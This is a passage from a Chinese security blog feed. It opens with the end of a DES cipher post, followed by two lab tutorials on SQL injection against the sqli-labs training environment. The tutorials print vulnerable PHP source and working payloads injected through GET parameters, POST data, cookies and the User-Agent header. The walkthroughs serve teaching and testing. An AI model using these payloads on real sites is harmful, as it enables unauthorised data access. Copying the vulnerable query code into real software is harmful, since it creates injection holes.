id="逆置换"><a href="#逆置换" class="headerlink" title="逆置换"></a>逆置换</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913224505.png" alt="image.png"></p><ul><li>以上的迭代算法成为函数f</li><li>进行完16次迭代，得到L16和R16，然后将LR调换，最后合并为64位的输出块，进行逆置换</li><li>逆置换根据上表，对应的位进行置换，逆置换是初始置换的逆运算，就是说初始置换输出的第1位是原始输入的第58位，第2位是第50位，而逆置换输出的第58位是输入的第1位，输出的第50位是输入的第2位</li><li>最后得到的64位输出块，则是DES加密的最终密文</li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day14 WEB漏洞-SQL注入之类型及提交注入</title>
      <link href="/2023/09/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day14%20WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day14%20WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909150934.png" alt="image.png"></p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>在真实SQL注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取,后续安全测试中我们也必须满足同等的操作才能进行注入。</li></ul><h2 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h2><ul><li>数字、字符、搜索、JSON等</li><li>直接输入的则为数字，如果是字符，则需要加上单引号</li><li>如果网站有搜索功能，那么搜索语句通常使用到%百分号</li></ul><h2 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h2><ul><li>GET,POST,COOKIE,REQUEST,HTTP头等</li><li>其中sql语句干扰符号：’，”，s，)，}等，具体需看写法</li></ul><h1 id="参数字符型注入测试"><a href="#参数字符型注入测试" class="headerlink" title="参数字符型注入测试"></a>参数字符型注入测试</h1><ul><li>sqli-labs less-5源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Less-<span class="number">5</span> Double Query- Single Quotes- String&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">&quot;#000000&quot;</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot; margin-top:60px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">&quot;3&quot;</span> color=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">#SQL执行的语句</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../images/Less-5.jpg&quot;</span> /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code>SQL执行的语句是采用了’ ‘闭合</li><li>我们要是直接使用<code>?id=1 and 1=1</code>相当于执行的是<code>SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;</code>，是不会有任何反应的<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909160210.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909160810.png" alt="image.png"></li><li>正确的报错语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>2</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161612.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161622.png" alt="image.png"></li><li>相当于在数据库执行<code> select * from users where id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161717.png" alt="image.png"></li><li>获取字段<code>?id=1&#39; order by 4 --+</code></li><li><code>--+</code>将后面的代码注释不执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161845.png" alt="image.png"></li><li>在数据库中执行<code> select * from users where id=&#39;1&#39; order by 4;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909162119.png" alt="image.png"></li><li>less-6源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure></li><li>可以看出采用了双引号的方式进行了编码，绕过方法”闭合前面的引号，后面采用–+注释</li><li><code>?id=1&quot; order by 4 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909162832.png" alt="image.png"></li></ul><h1 id="POST数据提交注入测试"><a href="#POST数据提交注入测试" class="headerlink" title="POST数据提交注入测试"></a>POST数据提交注入测试</h1><ul><li>sqli-labs less-11</li><li>输入错误的用户名密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164153.png" alt="image.png"></li><li>输入正确的用户名密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164139.png" alt="image.png"></li><li>源代码，其中加入<code>echo $sql;</code>回显sql执行命令<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164502.png" alt="image.png"></li></ul><h2 id="使用hackbar模拟post数据提交测试"><a href="#使用hackbar模拟post数据提交测试" class="headerlink" title="使用hackbar模拟post数据提交测试"></a>使用hackbar模拟post数据提交测试</h2><ul><li>hackbar安装地址：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a></li></ul><h3 id="使用hackbar进行登录测试"><a href="#使用hackbar进行登录测试" class="headerlink" title="使用hackbar进行登录测试"></a>使用hackbar进行登录测试</h3><ul><li>一般的登录情况都是采用的post提交数据、通过抓包获取到登录信息将它放在hackbar中进行登录测试，也是为了验证hackbar是否能正常使用，要是确认hackbar能正常使用这个可以跳过。</li><li>进行登录，然后使用burp抓包获取登录信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910150620.png" alt="image.png"></li><li>获取到的登录信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li>在hackbar当中进行测试，输入post data<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910150805.png" alt="image.png"></li><li>登录成功</li></ul><h3 id="枚举数据库字段"><a href="#枚举数据库字段" class="headerlink" title="枚举数据库字段"></a>枚举数据库字段</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151021.png" alt="image.png"></p><ul><li>post data以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; order by 3#&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure></li><li>在mysql当中一般注释后面的字句是采用<code>--+</code>，在有些字句中采用<code>#</code>注释。</li><li>需要多测试才能发现，为了验证<code>#</code>是注释符号，将<code>#</code>替换为<code>--+</code>执行，查看结果看到报错信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151418.png" alt="image.png"></li><li>在数据库当中执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151642.png" alt="image.png"></li><li>可以得出结论，最终验证<code>#</code>是注释了后面的字句</li><li>将order by 3改成2查看</li><li><code>uname=admin&#39; order by 2#&amp;passwd=admin&amp;submit=Submit</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151753.png" alt="image.png"></li><li>可以看到登录成功，但实际上登录的用户名密码是错误的，因为只将sql语句注入进去没有报错，下面的语句正常的执行就显示登录成功</li><li>换句话说就是登录到情况只有两个字段，很可能就是用户名密码。</li></ul><h3 id="枚举出数据库的名称"><a href="#枚举出数据库的名称" class="headerlink" title="枚举出数据库的名称"></a>枚举出数据库的名称</h3><ul><li><code>uname=admin&#39; and 1=2 union select database(),2 #&amp;passwd=admin&amp;submit=Submit</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910152437.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910152528.png" alt="image.png"></li></ul><h1 id="参数JSON数据注入测试"><a href="#参数JSON数据注入测试" class="headerlink" title="参数JSON数据注入测试"></a>参数JSON数据注入测试</h1><ul><li>本地环境代码演示</li><li>json格式<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910154035.png" alt="image.png"></li><li>json注入<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910154057.png" alt="image.png"></li><li>注入方式：如果是数字的，可以不加<code>&#39;</code>闭合，如果是字符的话，加上<code>&quot;</code>闭合</li></ul><h1 id="COOKIE数据提交注入测试"><a href="#COOKIE数据提交注入测试" class="headerlink" title="COOKIE数据提交注入测试"></a>COOKIE数据提交注入测试</h1><ul><li>sqli-labs less-20</li></ul><h2 id="网站传递参数的方式"><a href="#网站传递参数的方式" class="headerlink" title="网站传递参数的方式"></a>网站传递参数的方式</h2><table><thead><tr><th>参数类型</th><th>含义</th></tr></thead><tbody><tr><td>get型</td><td>一般访问网站的行为</td></tr><tr><td>cookie型</td><td>伴随着访问网页的行为</td></tr><tr><td>post型</td><td>上传文件，登录</td></tr></tbody></table><ul><li><strong>cookie注入原理</strong>：对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。</li><li>cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。</li><li>条件一：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤</li><li>条件二： 条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</li><li>通过burp抓包分析<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160215.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160224.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160232.png" alt="image.png"></li><li>这里在数据包当中发现了一个带cookie的参数<code>Cookie: uname=Dumb</code></li><li>将这个数据包发送到repeater（重发器）当中</li><li>并修改cookie参数<code>Cookie: uname=Dumb&#39; and 1=2 union select database(),2,3 #</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910161119.png" alt="image.png"></li><li>写改为<code>Cookie: uname=Dumb&#39; and 1=2 union select user(),2,3 #</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910161256.png" alt="image.png"></li></ul><h1 id="HTTP头部参数数据注入测试"><a href="#HTTP头部参数数据注入测试" class="headerlink" title="HTTP头部参数数据注入测试"></a>HTTP头部参数数据注入测试</h1><ul><li>sqli-labs less-18</li><li>查看数据库源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br><span class="line"><span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>根据源代码可以看出，对执行的insert语句没有任何的限制，也就是说我们通过修改http的头部信息可以达到sql注入的效果</li><li>为方便实验，在103行加入sql语句的显示界面<code>echo $insert;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162059.png" alt="image.png"></li><li>修改数据包注入，获取数据库名称</li><li><code>User-Agent: &#39;and extractvalue (1,concat(0x7e,(select database()),0x7e)) and&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162314.png" alt="image.png"></li><li>获取用户名<code>User-Agent: &#39;and extractvalue (1,concat(0x7e,(select user()),0x7e)) and&#39; Firefox/116.0</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162449.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day13 WEB漏洞SQL注入之MYSQL注入</title>
      <link href="/2023/09/08/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day13%20WEB%E6%BC%8F%E6%B4%9ESQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/08/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day13%20WEB%E6%BC%8F%E6%B4%9ESQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907131330.png" alt="image.png"></p><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ul><li>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</li><li>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</li></ul><h2 id="SCHEMATA表"><a href="#SCHEMATA表" class="headerlink" title="SCHEMATA表"></a>SCHEMATA表</h2><ul><li>当前MySQL实例中所有数据库的信息</li><li><code>SHOW DATABASES;</code>命令用来从这个表获取数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907200630.png" alt="image.png"></li></ul><h2 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h2><ul><li><code>select SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907200841.png" alt="image.png"></li></ul><h2 id="TABLES表"><a href="#TABLES表" class="headerlink" title="TABLES表"></a>TABLES表</h2><ul><li>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。</li><li><code>SHOW TABLES FROM XX;</code> 命令从这个表获取结果。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907201507.png"></li></ul><h2 id="COLUMNS表"><a href="#COLUMNS表" class="headerlink" title="COLUMNS表"></a>COLUMNS表</h2><ul><li>存储表中的列信息，包括表有多少列、每个列的类型等。<code>SHOW COLUMNS FROM schemaname.tablename</code> 命令从这个表获取结果。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907220526.png" alt="image.png"></li></ul><h2 id="USER-PRIVILEGES表"><a href="#USER-PRIVILEGES表" class="headerlink" title="USER_PRIVILEGES表"></a>USER_PRIVILEGES表</h2><ul><li>用户权限表。内容源自 mysql.user 授权表。是非标准表。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907220730.png" alt="image.png"></li></ul><h1 id="跨库攻击"><a href="#跨库攻击" class="headerlink" title="跨库攻击"></a>跨库攻击</h1><ul><li>前提准备<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database book;</span><br><span class="line">mysql&gt; use book;</span><br><span class="line">mysql&gt; CREATE TABLE IF NOT EXISTS book(    `book_id` INT UNSIGNED AUTO_INCREMENT,    `book_title` VARCHAR(100) NOT NULL,    `book_author` VARCHAR(40) NOT NULL,    `submission_date` DATE,    PRIMARY KEY ( `book_id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| book               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">mysql&gt; use book;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_book |</span><br><span class="line">+----------------+</span><br><span class="line">| book           |</span><br><span class="line">+----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc book;</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">| Field           | Type             | Null | Key | Default | Extra          |</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">| book_id         | int(10) unsigned | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| book_title      | varchar(100)     | NO   |     | NULL    |                |</span><br><span class="line">| book_author     | varchar(40)      | NO   |     | NULL    |                |</span><br><span class="line">| submission_date | <span class="built_in">date</span>             | YES  |     | NULL    |                |</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></li><li>打开网页进行查询当前数据库的用户</li><li><code>?id=-1%20union%20select%201,user(),3</code></li><li>可以看见当前用户为root，拥有最高权限<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907222102.png" 